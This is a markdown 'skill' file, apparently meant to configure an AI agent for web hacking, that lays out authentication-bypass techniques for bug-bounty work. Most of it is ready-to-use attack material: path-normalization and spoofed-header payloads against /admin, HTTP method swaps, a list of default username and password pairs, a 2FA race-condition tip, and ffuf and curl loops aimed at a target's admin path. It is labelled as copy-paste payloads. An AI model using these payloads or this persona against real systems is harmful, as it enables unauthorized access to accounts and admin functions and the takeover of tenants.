# SKILL: Authentication Bypass (logic / SQLi-in-login / SSO / SAML / OAuth / 2FA-precomputed / cache key)

## Version: 1.0 | Domain: web | Trigger: `WEB MODE` + (authentication bypass (logic / sqli-in-login / sso / saml / oauth / 2fa-precomputed / cache key)) or pasted request matching this class

---

## IDENTITY IN THIS SKILL
Pre-auth bypasses are the highest-value bugs in any program. I scan login flow for parsing inconsistencies, race conditions, and cache poisoning before brute-force.

---

## DETECTION
(see exploitation)

## EXPLOITATION
### Bypass via SQL/NoSQL in login
- See `sqli_all_types.md` payloads.

### Path normalization bypass
```
GET /admin                      → 403
GET /admin/                     → 200
GET /admin..;/                  → 200 (Tomcat)
GET /admin/.                    → 200
GET /%2e/admin                  → 200
GET /admin%20                   → 200
GET /;param=1/admin             → 200
GET //admin                     → 200
GET /admin#                     → 200
GET /admin?                     → 200
```

### Header-based bypass
```
X-Original-URL: /admin
X-Rewrite-URL: /admin
X-Forwarded-For: 127.0.0.1
X-Forwarded-Host: localhost
X-Custom-IP-Authorization: 127.0.0.1
X-Originating-IP: 127.0.0.1
X-Real-IP: 127.0.0.1
X-Remote-IP: 127.0.0.1
X-Remote-Addr: 127.0.0.1
X-ProxyUser-Ip: 127.0.0.1
Forwarded: for=127.0.0.1
True-Client-IP: 127.0.0.1
Cluster-Client-IP: 127.0.0.1
CF-Connecting-IP: 127.0.0.1
```

### HTTP method swap
`GET /admin` → 403 ; `POST /admin` → 200; or `OPTIONS /admin` → 200; or `TRACE` returns body.

### HTTP/2 vs HTTP/1.1 differential
WAF only inspects HTTP/1.1 → request /admin via HTTP/2.

### Same path different host
Vhost confusion: `Host: admin.target.com` from external IP if internal nginx routes by Host header.

### Default creds
```
admin / admin
admin / password
admin / 123456
admin / changeme
root / root
test / test
guest / guest
admin / target.com
admin / Spring2024!
```

### Race condition login
Submit login + 2FA confirm in the same window before MFA enforcement check.

## PAYLOADS (real, copy-paste, grouped)
(see above)

## BYPASS TECHNIQUES
(method/header/path encoding/encoding tier — see above)

## CHAIN POTENTIAL
Auth bypass → ATO → tenant takeover.

## TOOLS
ffuf with header wordlist; Burp Param Miner; ja3/jarm differential; sqlmap on login fields.

## COMMANDS
```bash
# 403 bypasser
ffuf -u 'https://target/admin' -H 'X-Original-URL: /admin' -mc 200,302
# Method bruter
for m in GET POST PUT PATCH DELETE OPTIONS HEAD TRACE PROPFIND; do
  echo -n "$m: "; curl -sk -o /dev/null -w '%{http_code}\n' -X $m https://target/admin
done
```

## EDGE CASES / NOT-A-BUG TRAPS
Some 200 responses are actually error pages with 200 status. Check body, not just status.

## TRIAGE ANGLE (per platform)
Show authenticated-only data extracted via the bypass.

## SEVERITY & CVSS
8.5–9.8 depending on access gained.

## REFERENCES
PortSwigger Auth • PayloadsAllTheThings/Authentication
